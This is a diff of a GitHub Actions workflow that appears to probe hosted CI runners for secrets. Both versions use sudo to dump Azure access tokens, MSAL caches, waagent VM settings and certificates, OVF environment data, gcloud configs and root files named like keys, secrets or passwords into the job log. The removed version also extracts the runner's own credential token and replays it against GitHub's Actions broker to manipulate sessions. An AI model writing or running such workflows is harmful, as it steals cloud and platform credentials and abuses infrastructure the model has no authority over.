@@ -1,57 +1,39 @@
-name: RootAzure
+name: WaagentGC
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: root azure scan
+      - name: waagent and gcloud
         timeout-minutes: 5
         run: |
           set +e
-          echo === ROOT AZURE CONFIG ===
-          sudo find /root/.azure -type f 2>/dev/null | head -30
-          echo === AZURE PROFILE ===
-          sudo cat /root/.azure/azureProfile.json 2>/dev/null | head -30
-          echo === AZURE CLOUD CONFIG ===
-          sudo cat /root/.azure/clouds.config 2>/dev/null | head -20
-          echo === AZURE CONFIG ===
-          sudo cat /root/.azure/config 2>/dev/null | head -20
-          echo === AZURE TOKENS ===
-          sudo cat /root/.azure/accessTokens.json 2>/dev/null | head -20
-          sudo cat /root/.azure/msal_token_cache.json 2>/dev/null | head -20
-          echo === AZURE DEVOPS ===
-          sudo find /root/.azure-devops -type f 2>/dev/null | head -10
-          sudo cat /root/.azure-devops/.default 2>/dev/null
-          echo === ANSIBLE ===
-          sudo find /root/.ansible -type f 2>/dev/null | head -10
-          sudo cat /root/.ansible/ansible.cfg 2>/dev/null | head -10
-          echo === ROOT CONFIG ===
-          sudo find /root/.config -type f 2>/dev/null | head -20
-          echo === ROOT BASHRC ===
-          sudo cat /root/.bashrc 2>/dev/null | head -20
-          echo === ROOT DOTNET ===
-          sudo find /root/.dotnet -name '*.json' -type f 2>/dev/null | while read f; do
+          echo === VMSETTINGS JSON ===
+          sudo cat /var/lib/waagent/history/*/VmSettings.json 2>/dev/null | head -80
+          echo === FAST TRACK JSON ===
+          sudo cat /var/lib/waagent/fast_track.json 2>/dev/null | head -20
+          echo === CERTIFICATES JSON ===
+          sudo cat /var/lib/waagent/history/*/Certificates.json 2>/dev/null | head -30
+          echo === WAAGENT STATUS ===
+          sudo cat /var/lib/waagent/history/*/waagent_status.json 2>/dev/null | head -20
+          echo === OVF ENV ===
+          sudo cat /var/lib/waagent/ovf-env.xml 2>/dev/null | head -30
+          echo === GCLOUD CONFIG ===
+          sudo cat /root/.config/gcloud/gce 2>/dev/null
+          sudo find /root/.config/gcloud -type f 2>/dev/null | head -10
+          for f in $(sudo find /root/.config/gcloud -name '*.json' -o -name '*.yaml' -o -name 'gce' 2>/dev/null); do
             echo "--- $f ---"
-            sudo cat "$f" 2>/dev/null | head -10
+            sudo cat "$f" 2>/dev/null | head -15
           done
-          echo === ALL ROOT SENSITIVE FILES ===
-          sudo find /root -name '*.json' -o -name '*.key' -o -name '*.pem' -o -name '*.token' -o -name '*secret*' -o -name '*credential*' -o -name '*password*' -o -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -30
-          echo === ROOT SSH ===
-          sudo ls -la /root/.ssh/ 2>/dev/null
-          echo === WAAGENT FULL ===
-          sudo find /var/lib/waagent -name '*.json' -o -name '*.xml' -o -name '*.cfg' 2>/dev/null | head -20
-          sudo cat /var/lib/waagent/waagent_status.json 2>/dev/null | head -10
-          echo === BROKER MESSAGE WITH STATUS ===
-          CRED=$(cat /home/runner/actions-runner/cached/2.336.0/.credentials 2>/dev/null || cat /home/runner/actions-runner/cached/2.335.1/.credentials 2>/dev/null)
-          TOKEN=$(echo $CRED | python3 -c 'import sys,json; print(json.loads(sys.stdin.read()).get("Data",{}).get("token",""))')
-          BROKER=https://broker.actions.githubusercontent.com
-          curl -s --max-time 5 -X DELETE -H "Authorization: Bearer $TOKEN" $BROKER/session > /dev/null 2>&1
-          curl -s --max-time 5 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{}' $BROKER/session > /dev/null 2>&1
-          for status in idle online busy active; do
-            RESP=$(curl -s --max-time 5 -w '\nHTTP_%{http_code}' -H "Authorization: Bearer $TOKEN" -H "X-Runner-Status: $status" "$BROKER/message" 2>&1)
-            CODE=$(echo "$RESP" | tail -1)
-            BODY=$(echo "$RESP" | head -5 | head -c 300)
-            echo "message status=$status: $CODE $BODY"
-          done
+          echo === GCLOUD LOG ===
+          sudo cat /root/.config/gcloud/logs/2026.07.20/08.29.36.062792.log 2>/dev/null | head -20
+          echo === NUGET CACHE ===
+          sudo find /root/.local/share/NuGet -type f 2>/dev/null | head -5
+          echo === GEM SPECS ===
+          sudo find /root/.local/share/gem -name '*credential*' -o -name '*token*' -o -name '*secret*' 2>/dev/null | head -5
+          echo === POWERSHELL PROFILE ===
+          sudo cat /root/.config/powershell/profile.ps1 2>/dev/null | head -15
+          echo === ALL AZURE LOGS ===
+          sudo cat /root/.azure/commands/*.log 2>/dev/null | head -30
           echo === DONE ===
